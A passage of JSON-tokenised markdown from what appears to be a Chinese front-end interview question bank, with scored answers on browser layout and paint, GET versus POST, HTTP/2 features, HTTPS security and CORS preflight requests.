当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","text":" 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","task":false,"loose":false,"text":"**1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","tokens":[{"type":"text","raw":"**1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","text":"**1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","text":" 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## GET和POST有什么区别？\\n\\n","depth":2,"text":"GET和POST有什么区别？","tokens":[{"type":"text","raw":"GET和POST有什么区别？","text":"GET和POST有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。\\n- 由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。\\n- GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。\\n- GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。\\n- GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。\\n- GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。\\n","task":false,"loose":false,"text":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","tokens":[{"type":"text","raw":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","text":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","tokens":[{"type":"text","raw":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","text":"GET请求的请求参数会附加在URL之后，参数之间使用\\"&\\"连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。","escaped":false}]}]},{"type":"list_item","raw":"- 由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。\\n","task":false,"loose":false,"text":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","tokens":[{"type":"text","raw":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","text":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","tokens":[{"type":"text","raw":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","text":"由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。\\n","task":false,"loose":false,"text":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","tokens":[{"type":"text","raw":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","text":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","tokens":[{"type":"text","raw":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","text":"GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。\\n","task":false,"loose":false,"text":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","tokens":[{"type":"text","raw":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","text":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","tokens":[{"type":"text","raw":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","text":"GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。\\n","task":false,"loose":false,"text":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","tokens":[{"type":"text","raw":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","text":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","tokens":[{"type":"text","raw":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","text":"GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。","escaped":false}]}]},{"type":"list_item","raw":"- GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","task":false,"loose":false,"text":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","tokens":[{"type":"text","raw":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","text":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","tokens":[{"type":"text","raw":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","text":"GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## HTTP2相对于HTTP1.x有什么优势和特点？\\n\\n","depth":2,"text":"HTTP2相对于HTTP1.x有什么优势和特点？","tokens":[{"type":"text","raw":"HTTP2相对于HTTP1.x有什么优势和特点？","text":"HTTP2相对于HTTP1.x有什么优势和特点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。\\n- HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。\\n- HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。\\n- HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。\\n- HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。\\n","task":false,"loose":false,"text":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","tokens":[{"type":"text","raw":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","text":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","tokens":[{"type":"text","raw":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","text":"HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。\\n","task":false,"loose":false,"text":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","tokens":[{"type":"text","raw":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","text":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","tokens":[{"type":"text","raw":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","text":"HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。\\n","task":false,"loose":false,"text":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","tokens":[{"type":"text","raw":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","text":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","tokens":[{"type":"text","raw":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","text":"HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。\\n","task":false,"loose":false,"text":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","tokens":[{"type":"text","raw":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","text":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","tokens":[{"type":"text","raw":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","text":"HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","task":false,"loose":false,"text":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","tokens":[{"type":"text","raw":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","text":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","tokens":[{"type":"text","raw":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","text":"HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## https是怎么保证安全的，为什么比http安全？\\n\\n","depth":2,"text":"https是怎么保证安全的，为什么比http安全？","tokens":[{"type":"text","raw":"https是怎么保证安全的，为什么比http安全？","text":"https是怎么保证安全的，为什么比http安全？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。\\n- HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。\\n- 在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。\\n","task":false,"loose":false,"text":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","tokens":[{"type":"text","raw":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","text":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","tokens":[{"type":"text","raw":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","text":"HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。","escaped":false}]}]},{"type":"list_item","raw":"- HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。\\n","task":false,"loose":false,"text":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","tokens":[{"type":"text","raw":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","text":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","tokens":[{"type":"text","raw":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","text":"HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。","escaped":false}]}]},{"type":"list_item","raw":"- 在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","task":false,"loose":false,"text":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","tokens":[{"type":"text","raw":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","text":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","tokens":[{"type":"text","raw":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","text":"在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## post请求为什么会多发送一次option请求？\\n\\n","depth":2,"text":"post请求为什么会多发送一次option请求？","tokens":[{"type":"text","raw":"post请求为什么会多发送一次option请求？","text":"post请求为什么会多发送一次option请求？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","task":false,"loose":false,"text":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","tokens":[{"type":"text","raw":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n\\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","text":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","tokens":[{"type":"text","raw":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。","text":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。","escaped":false},{"type":"br","raw":"  